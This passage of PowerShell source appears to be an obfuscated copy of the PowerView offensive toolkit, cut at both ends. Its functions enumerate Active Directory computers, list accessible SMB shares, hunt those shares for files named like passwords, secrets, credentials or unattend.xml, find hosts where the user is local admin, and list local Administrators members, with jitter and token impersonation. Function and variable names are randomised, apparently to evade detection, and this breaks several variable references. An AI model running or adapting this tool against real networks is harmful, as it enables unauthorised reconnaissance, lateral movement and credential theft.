        [Double]
        $ZfNRkQyXmbOtsJi = .3,

        [Int]
        [ValidateRange(1, 100)]
        $bCPdUwesQHczYxi = 20
    )

    BEGIN {

        $uZfdOJKpxwOpKKH = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $uZfdOJKpxwOpKKH['Domain'] = $GyzgQ99fslvJJXn }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $uZfdOJKpxwOpKKH['LDAPFilter'] = $oE9vUfkxgRReuty }
        if ($PSBoundParameters['ComputerSearchBase']) { $uZfdOJKpxwOpKKH['SearchBase'] = $UmwYca9aFyjuaIs }
        if ($PSBoundParameters['Unconstrained']) { $uZfdOJKpxwOpKKH['Unconstrained'] = $Ku9ZmWgd9fLSPTw }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $uZfdOJKpxwOpKKH['OperatingSystem'] = $eloJwlA9uqrC9UD }
        if ($PSBoundParameters['ComputerServicePack']) { $uZfdOJKpxwOpKKH['ServicePack'] = $NIr9bUdzpfH9Gni }
        if ($PSBoundParameters['ComputerSiteName']) { $uZfdOJKpxwOpKKH['SiteName'] = $SmSMWEXMkNVoOuD }
        if ($PSBoundParameters['Server']) { $uZfdOJKpxwOpKKH['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $uZfdOJKpxwOpKKH['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $uZfdOJKpxwOpKKH['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $uZfdOJKpxwOpKKH['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $uZfdOJKpxwOpKKH['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $uZfdOJKpxwOpKKH['Credential'] = $szvFVWkPJummdcf }

        if ($PSBoundParameters['ComputerName']) {
            $plcGtRUbnHLQSQg = $cNTDaoDBIWkDu9I
        }
        else {
            Write-Verbose '[symmetrical] Querying computers in the domain'
            $plcGtRUbnHLQSQg = eigenvalues @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[symmetrical] TargetComputers length: $($plcGtRUbnHLQSQg.Length)"
        if ($plcGtRUbnHLQSQg.Length -eq 0) {
            throw '[symmetrical] No hosts found to enumerate'
        }


        $ErAMHSSYDKfA9ql = {
            Param($cNTDaoDBIWkDu9I, $nxwuJVGdfkClEL9, $waC9KrLWsegTDKV)

            if ($waC9KrLWsegTDKV) {

                $Null = descendents -waC9KrLWsegTDKV $waC9KrLWsegTDKV -Quiet
            }

            ForEach ($dtDeQCTchbpHZVi in $cNTDaoDBIWkDu9I) {
                $Up = Test-Connection -Count 1 -Quiet -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                if ($Up) {

                    $pv9je9fspMhn9kD = unfriends -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                    ForEach ($Share in $pv9je9fspMhn9kD) {
                        $sTefHRNADQwPSnD = $Share.Name

                        $Path = '\\'+$dtDeQCTchbpHZVi+'\'+$sTefHRNADQwPSnD

                        if (($sTefHRNADQwPSnD) -and ($sTefHRNADQwPSnD.trim() -ne '')) {

                            if ($nxwuJVGdfkClEL9) {

                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($waC9KrLWsegTDKV) {
                volubility
            }
        }

        $wFitNRlTdxnBQoR = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
            }
            else {
                $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf -Quiet
            }
        }
    }

    PROCESS {

        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[symmetrical] Total number of hosts: $($plcGtRUbnHLQSQg.count)"
            Write-Verbose "[symmetrical] Delay: $Delay, Jitter: $ZfNRkQyXmbOtsJi"
            $gdk9IoHOntLjUfN = 0
            $KJMo9RKXqLNQvnV = New-Object System.Random

            ForEach ($dtDeQCTchbpHZVi in $plcGtRUbnHLQSQg) {
                $gdk9IoHOntLjUfN = $gdk9IoHOntLjUfN + 1


                Start-Sleep -Seconds $KJMo9RKXqLNQvnV.Next((1-$ZfNRkQyXmbOtsJi)*$Delay, (1+$ZfNRkQyXmbOtsJi)*$Delay)

                Write-Verbose "[symmetrical] Enumerating server $dtDeQCTchbpHZVi ($gdk9IoHOntLjUfN of $($plcGtRUbnHLQSQg.count))"
                Invoke-Command -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -ArgumentList $dtDeQCTchbpHZVi, $nxwuJVGdfkClEL9, $wFitNRlTdxnBQoR
            }
        }
        else {
            Write-Verbose "[symmetrical] Using threading with threads: $bCPdUwesQHczYxi"


            $kWZJZEzyPFVetra = @{
                'CheckShareAccess' = $nxwuJVGdfkClEL9
                'TokenHandle' = $wFitNRlTdxnBQoR
            }


            overhanging -cNTDaoDBIWkDu9I $plcGtRUbnHLQSQg -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -Xz99HsFbkRJSMQr $kWZJZEzyPFVetra -bCPdUwesQHczYxi $bCPdUwesQHczYxi
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function replaced {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cNTDaoDBIWkDu9I,

        [ValidateNotNullOrEmpty()]
        [String]
        $GyzgQ99fslvJJXn,

        [ValidateNotNullOrEmpty()]
        [String]
        $oE9vUfkxgRReuty,

        [ValidateNotNullOrEmpty()]
        [String]
        $UmwYca9aFyjuaIs,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $OsAyFkcArbBEJUH,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $mQaSIPnAtdFBzca,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $BYbApcQRbSfXVl9,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $VmsRTHS9Yi9fqyN = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $9rASdHTtxoTDdSb,

        [String[]]
        $9FsLQrSjRCvzBrT = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CVUqfRwSUTCCPng,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $vepvpaBfReSlwj9,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $WGwTpjRygEvPST9,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $PI9oxzrjz9dRLsr,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $e9iKytvkknYRAr9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ZfNRkQyXmbOtsJi = .3,

        [Int]
        [ValidateRange(1, 100)]
        $bCPdUwesQHczYxi = 20
    )

    BEGIN {
        $uZfdOJKpxwOpKKH = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $uZfdOJKpxwOpKKH['Domain'] = $GyzgQ99fslvJJXn }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $uZfdOJKpxwOpKKH['LDAPFilter'] = $oE9vUfkxgRReuty }
        if ($PSBoundParameters['ComputerSearchBase']) { $uZfdOJKpxwOpKKH['SearchBase'] = $UmwYca9aFyjuaIs }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $uZfdOJKpxwOpKKH['OperatingSystem'] = $eloJwlA9uqrC9UD }
        if ($PSBoundParameters['ComputerServicePack']) { $uZfdOJKpxwOpKKH['ServicePack'] = $NIr9bUdzpfH9Gni }
        if ($PSBoundParameters['ComputerSiteName']) { $uZfdOJKpxwOpKKH['SiteName'] = $SmSMWEXMkNVoOuD }
        if ($PSBoundParameters['Server']) { $uZfdOJKpxwOpKKH['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $uZfdOJKpxwOpKKH['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $uZfdOJKpxwOpKKH['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $uZfdOJKpxwOpKKH['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $uZfdOJKpxwOpKKH['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $uZfdOJKpxwOpKKH['Credential'] = $szvFVWkPJummdcf }

        if ($PSBoundParameters['ComputerName']) {
            $plcGtRUbnHLQSQg = $cNTDaoDBIWkDu9I
        }
        else {
            Write-Verbose '[replaced] Querying computers in the domain'
            $plcGtRUbnHLQSQg = eigenvalues @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[replaced] TargetComputers length: $($plcGtRUbnHLQSQg.Length)"
        if ($plcGtRUbnHLQSQg.Length -eq 0) {
            throw '[replaced] No hosts found to enumerate'
        }


        $ErAMHSSYDKfA9ql = {
            Param($cNTDaoDBIWkDu9I, $VmsRTHS9Yi9fqyN, $9FsLQrSjRCvzBrT, $PI9oxzrjz9dRLsr, $VXZkuylGPNtqeof, $e9iKytvkknYRAr9, $GykqIBLZun9rlEp, $waC9KrLWsegTDKV)

            if ($waC9KrLWsegTDKV) {

                $Null = descendents -waC9KrLWsegTDKV $waC9KrLWsegTDKV -Quiet
            }

            ForEach ($dtDeQCTchbpHZVi in $cNTDaoDBIWkDu9I) {

                $DPThHyIZXvcrjOU = @()
                if ($dtDeQCTchbpHZVi.StartsWith('\\')) {

                    $DPThHyIZXvcrjOU += $dtDeQCTchbpHZVi
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                    if ($Up) {

                        $pv9je9fspMhn9kD = unfriends -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                        ForEach ($Share in $pv9je9fspMhn9kD) {
                            $sTefHRNADQwPSnD = $Share.Name
                            $Path = '\\'+$dtDeQCTchbpHZVi+'\'+$sTefHRNADQwPSnD

                            if (($sTefHRNADQwPSnD) -and ($sTefHRNADQwPSnD.Trim() -ne '')) {

                                if ($9FsLQrSjRCvzBrT -NotContains $sTefHRNADQwPSnD) {

                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $DPThHyIZXvcrjOU += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $DPThHyIZXvcrjOU) {
                    Write-Verbose "Searching share: $Share"
                    $DwuFQHBdmNtwT9E = @{
                        'Path' = $Share
                        'Include' = $VmsRTHS9Yi9fqyN
                    }
                    if ($PI9oxzrjz9dRLsr) {
                        $DwuFQHBdmNtwT9E['OfficeDocs'] = $PI9oxzrjz9dRLsr
                    }
                    if ($e9iKytvkknYRAr9) {
                        $DwuFQHBdmNtwT9E['FreshEXEs'] = $e9iKytvkknYRAr9
                    }
                    if ($CVUqfRwSUTCCPng) {
                        $DwuFQHBdmNtwT9E['LastAccessTime'] = $CVUqfRwSUTCCPng
                    }
                    if ($vepvpaBfReSlwj9) {
                        $DwuFQHBdmNtwT9E['LastWriteTime'] = $vepvpaBfReSlwj9
                    }
                    if ($WGwTpjRygEvPST9) {
                        $DwuFQHBdmNtwT9E['CreationTime'] = $WGwTpjRygEvPST9
                    }
                    if ($GykqIBLZun9rlEp) {
                        $DwuFQHBdmNtwT9E['CheckWriteAccess'] = $GykqIBLZun9rlEp
                    }
                    bronco @SearchArgs
                }
            }

            if ($waC9KrLWsegTDKV) {
                volubility
            }
        }

        $wFitNRlTdxnBQoR = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
            }
            else {
                $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf -Quiet
            }
        }
    }

    PROCESS {

        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[replaced] Total number of hosts: $($plcGtRUbnHLQSQg.count)"
            Write-Verbose "[replaced] Delay: $Delay, Jitter: $ZfNRkQyXmbOtsJi"
            $gdk9IoHOntLjUfN = 0
            $KJMo9RKXqLNQvnV = New-Object System.Random

            ForEach ($dtDeQCTchbpHZVi in $plcGtRUbnHLQSQg) {
                $gdk9IoHOntLjUfN = $gdk9IoHOntLjUfN + 1


                Start-Sleep -Seconds $KJMo9RKXqLNQvnV.Next((1-$ZfNRkQyXmbOtsJi)*$Delay, (1+$ZfNRkQyXmbOtsJi)*$Delay)

                Write-Verbose "[replaced] Enumerating server $dtDeQCTchbpHZVi ($gdk9IoHOntLjUfN of $($plcGtRUbnHLQSQg.count))"
                Invoke-Command -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -ArgumentList $dtDeQCTchbpHZVi, $VmsRTHS9Yi9fqyN, $9FsLQrSjRCvzBrT, $PI9oxzrjz9dRLsr, $VXZkuylGPNtqeof, $e9iKytvkknYRAr9, $GykqIBLZun9rlEp, $wFitNRlTdxnBQoR
            }
        }
        else {
            Write-Verbose "[replaced] Using threading with threads: $bCPdUwesQHczYxi"


            $kWZJZEzyPFVetra = @{
                'Include' = $VmsRTHS9Yi9fqyN
                'ExcludedShares' = $9FsLQrSjRCvzBrT
                'OfficeDocs' = $PI9oxzrjz9dRLsr
                'ExcludeHidden' = $VXZkuylGPNtqeof
                'FreshEXEs' = $e9iKytvkknYRAr9
                'CheckWriteAccess' = $GykqIBLZun9rlEp
                'TokenHandle' = $wFitNRlTdxnBQoR
            }


            overhanging -cNTDaoDBIWkDu9I $plcGtRUbnHLQSQg -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -Xz99HsFbkRJSMQr $kWZJZEzyPFVetra -bCPdUwesQHczYxi $bCPdUwesQHczYxi
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function rebuked {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cNTDaoDBIWkDu9I,

        [ValidateNotNullOrEmpty()]
        [String]
        $GyzgQ99fslvJJXn,

        [ValidateNotNullOrEmpty()]
        [String]
        $oE9vUfkxgRReuty,

        [ValidateNotNullOrEmpty()]
        [String]
        $UmwYca9aFyjuaIs,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $OsAyFkcArbBEJUH,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $mQaSIPnAtdFBzca,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $BYbApcQRbSfXVl9,

        [Switch]
        $nxwuJVGdfkClEL9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ZfNRkQyXmbOtsJi = .3,

        [Int]
        [ValidateRange(1, 100)]
        $bCPdUwesQHczYxi = 20
    )

    BEGIN {
        $uZfdOJKpxwOpKKH = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $uZfdOJKpxwOpKKH['Domain'] = $GyzgQ99fslvJJXn }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $uZfdOJKpxwOpKKH['LDAPFilter'] = $oE9vUfkxgRReuty }
        if ($PSBoundParameters['ComputerSearchBase']) { $uZfdOJKpxwOpKKH['SearchBase'] = $UmwYca9aFyjuaIs }
        if ($PSBoundParameters['Unconstrained']) { $uZfdOJKpxwOpKKH['Unconstrained'] = $Ku9ZmWgd9fLSPTw }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $uZfdOJKpxwOpKKH['OperatingSystem'] = $eloJwlA9uqrC9UD }
        if ($PSBoundParameters['ComputerServicePack']) { $uZfdOJKpxwOpKKH['ServicePack'] = $NIr9bUdzpfH9Gni }
        if ($PSBoundParameters['ComputerSiteName']) { $uZfdOJKpxwOpKKH['SiteName'] = $SmSMWEXMkNVoOuD }
        if ($PSBoundParameters['Server']) { $uZfdOJKpxwOpKKH['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $uZfdOJKpxwOpKKH['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $uZfdOJKpxwOpKKH['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $uZfdOJKpxwOpKKH['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $uZfdOJKpxwOpKKH['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $uZfdOJKpxwOpKKH['Credential'] = $szvFVWkPJummdcf }

        if ($PSBoundParameters['ComputerName']) {
            $plcGtRUbnHLQSQg = $cNTDaoDBIWkDu9I
        }
        else {
            Write-Verbose '[rebuked] Querying computers in the domain'
            $plcGtRUbnHLQSQg = eigenvalues @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[rebuked] TargetComputers length: $($plcGtRUbnHLQSQg.Length)"
        if ($plcGtRUbnHLQSQg.Length -eq 0) {
            throw '[rebuked] No hosts found to enumerate'
        }


        $ErAMHSSYDKfA9ql = {
            Param($cNTDaoDBIWkDu9I, $waC9KrLWsegTDKV)

            if ($waC9KrLWsegTDKV) {

                $Null = descendents -waC9KrLWsegTDKV $waC9KrLWsegTDKV -Quiet
            }

            ForEach ($dtDeQCTchbpHZVi in $cNTDaoDBIWkDu9I) {
                $Up = Test-Connection -Count 1 -Quiet -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                if ($Up) {

                    $IYm9ybrqCPDYZYv = Boulez -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                    if ($IYm9ybrqCPDYZYv.IsAdmin) {
                        $dtDeQCTchbpHZVi
                    }
                }
            }

            if ($waC9KrLWsegTDKV) {
                volubility
            }
        }

        $wFitNRlTdxnBQoR = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
            }
            else {
                $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf -Quiet
            }
        }
    }

    PROCESS {

        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[rebuked] Total number of hosts: $($plcGtRUbnHLQSQg.count)"
            Write-Verbose "[rebuked] Delay: $Delay, Jitter: $ZfNRkQyXmbOtsJi"
            $gdk9IoHOntLjUfN = 0
            $KJMo9RKXqLNQvnV = New-Object System.Random

            ForEach ($dtDeQCTchbpHZVi in $plcGtRUbnHLQSQg) {
                $gdk9IoHOntLjUfN = $gdk9IoHOntLjUfN + 1


                Start-Sleep -Seconds $KJMo9RKXqLNQvnV.Next((1-$ZfNRkQyXmbOtsJi)*$Delay, (1+$ZfNRkQyXmbOtsJi)*$Delay)

                Write-Verbose "[rebuked] Enumerating server $dtDeQCTchbpHZVi ($gdk9IoHOntLjUfN of $($plcGtRUbnHLQSQg.count))"
                Invoke-Command -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -ArgumentList $dtDeQCTchbpHZVi, $wFitNRlTdxnBQoR
            }
        }
        else {
            Write-Verbose "[rebuked] Using threading with threads: $bCPdUwesQHczYxi"


            $kWZJZEzyPFVetra = @{
                'TokenHandle' = $wFitNRlTdxnBQoR
            }


            overhanging -cNTDaoDBIWkDu9I $plcGtRUbnHLQSQg -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -Xz99HsFbkRJSMQr $kWZJZEzyPFVetra -bCPdUwesQHczYxi $bCPdUwesQHczYxi
        }
    }
}


function interrogatory {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cNTDaoDBIWkDu9I,

        [ValidateNotNullOrEmpty()]
        [String]
        $GyzgQ99fslvJJXn,

        [ValidateNotNullOrEmpty()]
        [String]
        $oE9vUfkxgRReuty,

        [ValidateNotNullOrEmpty()]
        [String]
        $UmwYca9aFyjuaIs,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $OsAyFkcArbBEJUH,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $mQaSIPnAtdFBzca,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $BYbApcQRbSfXVl9,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $T9tockrmJu9UTGT = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $hcDrBLy9ZyM9IkS = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ZfNRkQyXmbOtsJi = .3,

        [Int]
        [ValidateRange(1, 100)]
        $bCPdUwesQHczYxi = 20
    )

    BEGIN {
        $uZfdOJKpxwOpKKH = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $uZfdOJKpxwOpKKH['Domain'] = $GyzgQ99fslvJJXn }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $uZfdOJKpxwOpKKH['LDAPFilter'] = $oE9vUfkxgRReuty }
        if ($PSBoundParameters['ComputerSearchBase']) { $uZfdOJKpxwOpKKH['SearchBase'] = $UmwYca9aFyjuaIs }
        if ($PSBoundParameters['Unconstrained']) { $uZfdOJKpxwOpKKH['Unconstrained'] = $Ku9ZmWgd9fLSPTw }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $uZfdOJKpxwOpKKH['OperatingSystem'] = $eloJwlA9uqrC9UD }
        if ($PSBoundParameters['ComputerServicePack']) { $uZfdOJKpxwOpKKH['ServicePack'] = $NIr9bUdzpfH9Gni }
        if ($PSBoundParameters['ComputerSiteName']) { $uZfdOJKpxwOpKKH['SiteName'] = $SmSMWEXMkNVoOuD }
        if ($PSBoundParameters['Server']) { $uZfdOJKpxwOpKKH['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $uZfdOJKpxwOpKKH['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $uZfdOJKpxwOpKKH['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $uZfdOJKpxwOpKKH['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $uZfdOJKpxwOpKKH['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $uZfdOJKpxwOpKKH['Credential'] = $szvFVWkPJummdcf }

        if ($PSBoundParameters['ComputerName']) {
            $plcGtRUbnHLQSQg = $cNTDaoDBIWkDu9I
        }
        else {
            Write-Verbose '[interrogatory] Querying computers in the domain'
            $plcGtRUbnHLQSQg = eigenvalues @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[interrogatory] TargetComputers length: $($plcGtRUbnHLQSQg.Length)"
        if ($plcGtRUbnHLQSQg.Length -eq 0) {
            throw '[interrogatory] No hosts found to enumerate'
        }


        $ErAMHSSYDKfA9ql = {
            Param($cNTDaoDBIWkDu9I, $T9tockrmJu9UTGT, $hcDrBLy9ZyM9IkS, $waC9KrLWsegTDKV)


            if ($T9tockrmJu9UTGT -eq "Administrators") {
                $RJKUydPEfv9axGh = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $T9tockrmJu9UTGT = ($RJKUydPEfv9axGh.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($waC9KrLWsegTDKV) {

                $Null = descendents -waC9KrLWsegTDKV $waC9KrLWsegTDKV -Quiet
            }

            ForEach ($dtDeQCTchbpHZVi in $cNTDaoDBIWkDu9I) {
                $Up = Test-Connection -Count 1 -Quiet -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                if ($Up) {
                    $jZKAtdjEHdZXevj = @{
                        'ComputerName' = $dtDeQCTchbpHZVi
                        'Method' = $hcDrBLy9ZyM9IkS
                        'GroupName' = $T9tockrmJu9UTGT
                    }
                    kicking @NetLocalGroupMemberArguments
                }
            }

            if ($waC9KrLWsegTDKV) {
                volubility
            }
        }

        $wFitNRlTdxnBQoR = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
            }
            else {
                $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf -Quiet
            }
        }
    }

    PROCESS {

        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[interrogatory] Total number of hosts: $($plcGtRUbnHLQSQg.count)"
            Write-Verbose "[interrogatory] Delay: $Delay, Jitter: $ZfNRkQyXmbOtsJi"
            $gdk9IoHOntLjUfN = 0
            $KJMo9RKXqLNQvnV = New-Object System.Random

            ForEach ($dtDeQCTchbpHZVi in $plcGtRUbnHLQSQg) {
                $gdk9IoHOntLjUfN = $gdk9IoHOntLjUfN + 1


                Start-Sleep -Seconds $KJMo9RKXqLNQvnV.Next((1-$ZfNRkQyXmbOtsJi)*$Delay, (1+$ZfNRkQyXmbOtsJi)*$Delay)

                Write-Verbose "[interrogatory] Enumerating server $dtDeQCTchbpHZVi ($gdk9IoHOntLjUfN of $($plcGtRUbnHLQSQg.count))"
                Invoke-Command -xxcoHOOdC9XDRbN $ErAMHSSYDKfA9ql -ArgumentList $dtDeQCTchbpHZVi, $T9tockrmJu9UTGT, $hcDrBLy9ZyM9IkS, $wFitNRlTdxnBQoR
            }
        }
        else {
